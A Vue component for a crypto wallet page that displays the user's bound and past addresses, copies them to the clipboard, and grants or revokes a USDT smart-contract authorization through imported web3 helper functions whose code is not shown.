<template>
  <div>
    <White :title="title"></White>
    <div class="content">
      <div class="text">
        <van-cell-group title="当前绑定地址" :border="false">
          <van-cell value="" :border="false">
            <template #title>
              <span>{{ myaddress }}</span>
              <i
                class="iconfont icon-fuzhi icon"
                @click="handleCopy(address)"
              ></i>
            </template>
            <div class="changeBtn">
              <span v-if="impower" @click="sure">重新授权</span>

              <span v-else @click="close">取消授权</span>
              <!-- <span>解除绑定</span> -->
            </div>
          </van-cell>
        </van-cell-group>

        <div class="line"></div>

        <van-cell-group
          title="其他地址"
          :border="false"
          v-if="historyList.length != 0"
        >
          <van-cell
            v-for="(item, index) of historyList"
            :key="index"
            :border="false"
          >
            <template #title>
              <span>{{ item }}</span>
              <i
                class="iconfont icon-fuzhi icon"
                @click="handleCopy(list[index])"
              ></i>
            </template>
            <!-- <div :style="{ color: '#237ff8' }">
              <span>解除绑定</span>
            </div> -->
          </van-cell>
        </van-cell-group>
      </div>
    </div>
  </div>
</template>

<script>
import { Toast } from 'vant'
import { MemberWallet } from '@/api/trxRequest'
import { usdtsend, Approve } from '@/utils/web3'
import White from '@/components/Nav/white.vue'
export default {
  components: {
    White,
  },
  data() {
    return {
      show: false,
      selectActive: -1,

      address: 'sdkjsas134adssadasd',
      myaddress: '',
      historyList: [],
      list: [],
      selectAddress: {},

      title: '',
      net: '',
      impower: false,
    }
  },
  created() {
    let num = Approve()
    if (num * 1 > 0) {
      this.impower = false
    } else {
      this.impower = true
    }
  },
  mounted() {
    this.title = this.$route.params.addressItem
    this.net = this.title.toLowerCase()
    this.address = localStorage.getItem('myaddress')
    this.myaddress = this.string(this.address)

    this.init()
  },
  methods: {
    init() {
      MemberWallet({ uid: localStorage.getItem('uid'), net: this.net }).then(
        (res) => {
          let data = res.data
          for (let i of data) {
            i.ads = i.ads.trim()
            if (i.ads == this.address) {
              break
            } else {
              this.list.push(i.ads)
              this.historyList.push(this.string(i.ads))
            }
          }
        }
      )
    },
    string(data) {
      return (
        data.substring(0, 10) +
        '...' +
        data.substring(data.length - 10, data.length)
      )
    },

    async close() {
      await usdtsend(0, '取消授权')
      this.impower = true
    },
    async sure() {
      await usdtsend(1000000, '请先给智能合约授权')
      this.impower = false
    },
    handleCopy(val) {
      const that = this
      this.$copyText(val)
        .then(() => {
          Toast('复制成功')
        })
        .catch(() => {
          Toast('复制失败')
        })
    },
  },
}
</script>

<style lang="less" scoped>
.content {
  padding-top: 32px;

  .text {
    font-size: 28px;
    color: #333 !important;

    .van-cell-group__title {
      color: #333333;
    }

    .van-cell {
      align-items: center;
      color: #999999;
    }

    .line {
      background-color: #f3f4f5;
      height: 20px;
    }

    .changeBtn {
      color: #237ff8;
      // display: flex;
      // justify-content: space-around;
    }
  }
}
</style>
